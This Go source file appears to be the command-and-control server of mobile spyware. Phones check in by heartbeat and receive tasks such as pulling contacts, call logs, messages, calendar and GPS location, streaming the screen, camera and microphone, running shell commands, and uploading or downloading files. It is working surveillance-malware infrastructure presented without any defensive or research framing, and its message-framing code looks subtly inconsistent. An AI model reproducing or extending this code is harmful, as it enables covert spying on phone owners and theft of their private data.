package tcpservice

import (
	"bufio"
	"bytes"
	"csmm/common"
	"csmm/protos"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

const (
	HEARTBEAT_STAT_IDLE = "idle"
	HEARTBEAT_STAT_RUN  = "run"
)

const (
	MSGTYPE_HEARTBEAT uint32 = 1
	MSGTYPE_GETTASK   uint32 = 2
	MSGTYPE_TASK      uint32 = 3
	MSGTYPE_TASKRESP  uint32 = 4
)

const (
	TASKTYPE_DEVINFO      string = "devinfo"
	TASKTYPE_APPLIST      string = "applist"
	TASKTYPE_PROCLIST     string = "proclist"
	TASKTYPE_DIR          string = "dir"
	TASKTYPE_CONTACT      string = "contact"
	TASKTYPE_CALLLOG      string = "calllog"
	TASKTYPE_MESSAGE      string = "message"
	TASKTYPE_CALENDAR     string = "calendar"
	TASKTYPE_INTERNET     string = "internet"
	TASKTYPE_GPS          string = "gpsinfo"
	TASKTYPE_SCREENLIVE   string = "screenlive"
	TASKTYPE_VIDEOLIVE    string = "videolive"
	TASKTYPE_VIDEOLIVE1   string = "videolive1"
	TASKTYPE_SWITCHCAMERA string = "switchcamera"
	TASKTYPE_AUDIOLIVE    string = "audiolive"
	TASKTYPE_REMARK       string = "remark"
	TASKTYPE_SHELL        string = "shell"
	TASKTYPE_DOWNLOAD     string = "down"
	TASKTYPE_UPLOAD       string = "upload"
	TASKTYPE_NetLink      string = "netlink"
	TASKTYPE_CHAT         string = "chat"
)

var CsmmMap map[string]*protos.CsmmClient = make(map[string]*protos.CsmmClient)

func sendHeartbeatResp(conn net.Conn, msg *protos.HeartbeatReq) error {
	if msg == nil {
		return nil
	}

	respByte, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	buff := bytes.NewBuffer([]byte("\r\n"))
	if err := binary.Write(buff, binary.LittleEndian, uint32(MSGTYPE_HEARTBEAT)); err != nil {
		return err
	}
	if err := binary.Write(buff, binary.LittleEndian, uint32(len(respByte))); err != nil {
		return err
	}
	if n, err := buff.Write(respByte); n != len(respByte) || err != nil {
		return err
	}

	if n, err := conn.Write(buff.Bytes()); n != buff.Len() || err != nil {
		return err
	}

	return nil
}

func SendTask(csmm *protos.CsmmClient, task *protos.TaskStruct) error {
	for i := 0; i < 10 && csmm.NcConn == nil; i++ {
		time.Sleep(time.Second)
		continue // 通手机联上来取任务
	}

	if csmm.NcConn == nil {
		return fmt.Errorf("下发任务超时")
	}

	conn := *csmm.NcConn

	taskByte, err := json.Marshal(task)
	if err != nil {
		return err
	}

	buff := bytes.NewBuffer([]byte("\r\n"))
	if err := binary.Write(buff, binary.LittleEndian, uint32(MSGTYPE_TASK)); err != nil {
		return err
	}
	if err := binary.Write(buff, binary.LittleEndian, uint32(len(taskByte))); err != nil {
		return err
	}
	if n, err := buff.Write(taskByte); n != len(taskByte) || err != nil {
		return err
	}

	if n, err := conn.Write(buff.Bytes()); n != buff.Len() || err != nil {
		conn.Close()
		csmm.NcConn = nil // 重联
		return err
	}

	return nil
}

func processHeartbeatMsg(conn net.Conn, msgByte []byte) error {
	var req protos.HeartbeatReq
	if err := json.Unmarshal(msgByte, &req); err != nil {
		common.Logger.Sugar().Errorf("heartbeat err: ", string(msgByte), err)
		return err
	}
	common.Logger.Sugar().Debugf("heartbeat: %#v\n", req)

	remoteAddr := strings.Split(conn.RemoteAddr().String(), ":")[0]
	tmpCsmm := CsmmMap[req.Name]
	if tmpCsmm == nil {
		tmpCsmm = &protos.CsmmClient{
			Ip:     remoteAddr,
			Name:   req.Name,
			Remark: req.Remark,
			Time:   req.Time,
			Tasks:  make(map[string]*protos.TaskStruct),
		}
		CsmmMap[req.Name] = tmpCsmm
	} else {
		tmpCsmm.Name = req.Name
		tmpCsmm.Remark = req.Remark
		tmpCsmm.Ip = remoteAddr
		tmpCsmm.Time = req.Time
	}

	if len(tmpCsmm.Tasks) > 0 {
		return sendHeartbeatResp(conn, &protos.HeartbeatReq{
			Name: req.Name,
			Time: time.Now().Format("2006-01-02 15:04:05"),
			Stat: HEARTBEAT_STAT_RUN,
		})
	} else {
		return sendHeartbeatResp(conn, &protos.HeartbeatReq{
			Name: req.Name,
			Time: time.Now().Format("2006-01-02 15:04:05"),
			Stat: HEARTBEAT_STAT_IDLE,
		})
	}
}

func processGetTaskMsg(conn net.Conn, msgByte []byte) error {
	remoteAddr := strings.Split(conn.RemoteAddr().String(), ":")[0]

	var req protos.TaskReq
	if err := json.Unmarshal(msgByte, &req); err != nil {
		common.Logger.Sugar().Errorf("processGetTaskMsg msg ERR: ", conn.RemoteAddr(), string(msgByte), err)
		return err
	}

	csmm := CsmmMap[req.Name]
	if csmm == nil {
		common.Logger.Sugar().Errorf("processGetTaskMsg ERR: %v %#v\n", remoteAddr, req, CsmmMap)
		return nil
	}

	common.Logger.Sugar().Info("processGetTaskMsg msg: ", conn.RemoteAddr(), string(msgByte))
	csmm.NcConn = &conn

	return nil
}

func processGetTaskRespMsg(conn net.Conn, msgByte []byte) {
	common.Logger.Sugar().Debugf("processGetTaskRespMsg: %v %v\n", conn.RemoteAddr(), string(msgByte))

	var resp protos.TaskResp
	if err := json.Unmarshal(msgByte, &resp); err != nil {
		common.Logger.Sugar().Errorf("processGetTaskRespMsg msg ERR: ", conn.RemoteAddr(), string(msgByte), err)
		return
	}

	// remoteAddr := strings.Split(conn.RemoteAddr().String(), ":")[0]
	csmm := CsmmMap[resp.Name]
	if csmm == nil {
		common.Logger.Sugar().Errorf("processGetTaskRespMsg csmm ERR: %v %v\n", conn.RemoteAddr(), string(msgByte))
		return
	}

	task := csmm.Tasks[resp.TaskId]
	if task == nil {
		common.Logger.Sugar().Errorf("processGetTaskRespMsg task ERR: %v %v\n", conn.RemoteAddr(), string(msgByte))
		return
	}

	taskId, _ := strconv.Atoi(task.TaskId)
	respTaskId, _ := strconv.Atoi(resp.TaskId)
	if respTaskId >= taskId {
		go func() {
			task.RespChan <- &resp
			close(task.RespChan)
			delete(csmm.Tasks, task.TaskId)
		}()
	} else {
		// TODO
	}
}

func processOneMsg(conn net.Conn, msgType uint32, msgByte []byte) error {
	switch msgType {
	case MSGTYPE_HEARTBEAT:
		return processHeartbeatMsg(conn, msgByte)
	case MSGTYPE_GETTASK:
		return processGetTaskMsg(conn, msgByte)
	case MSGTYPE_TASKRESP:
		processGetTaskRespMsg(conn, msgByte)
	default:
		common.Logger.Sugar().Debugf("processOneMsg type ERR: %v\n", msgType, string(msgByte))
	}

	// sendShellTask(conn, &req)

	return nil
}

// 处理函数
func process(conn net.Conn) {
	defer conn.Close() //关闭连接

	data := bytes.NewBuffer([]byte{})
	reader := bufio.NewReader(conn) //获取输入流

	for {
		var buf [1024]byte            //每次读取的大小
		n, err := reader.Read(buf[:]) //读取数据 从头到尾读取
		if err != nil {
			common.Logger.Sugar().Errorf("read client ERR: %v %v\n", conn.RemoteAddr(), err)
			if strings.Contains(err.Error(), "i/o timeout") {
				continue
			}

			break
		}
		// common.Logger.Sugar().Errorf("read client: %v %v %v\n", conn.RemoteAddr(), n, err)

		dn, err := data.Write(buf[:n])
		if dn != n || err != nil {
			panic(err)
		}
		if data.Len() < 10 {
			continue // 头的长度
		}

		dataByte := data.Bytes()
		for i := 0; i < len(dataByte)-1; i++ {
			if dataByte[i] == '\r' && dataByte[i+1] == '\n' {
				if len(dataByte)-(i+1) < 8 {
					break
				}

				msgType := binary.LittleEndian.Uint32(dataByte[i+2 : i+6])
				msgLen := binary.LittleEndian.Uint32(dataByte[i+6 : i+10])
				// common.Logger.Sugar().Errorf("read client: %v %v %v %v\n", conn.RemoteAddr(), msgType, msgLen, data.Len())
				if data.Len()-(i+10) >= int(msgLen) {
					processOneMsg(conn, msgType, dataByte[i+10:i+10+int(msgLen)])

					data = bytes.NewBuffer(dataByte[i+6+int(msgLen):]) // 重置数据
				}
			}
		}
	}
}

func InitTcpService(addr string) {
	listen, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Println("listen failed,err", err)
		return
	}

	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("accept failed: ", err)
			continue
		}

		go process(conn) // 去处理读取数据
	}
}
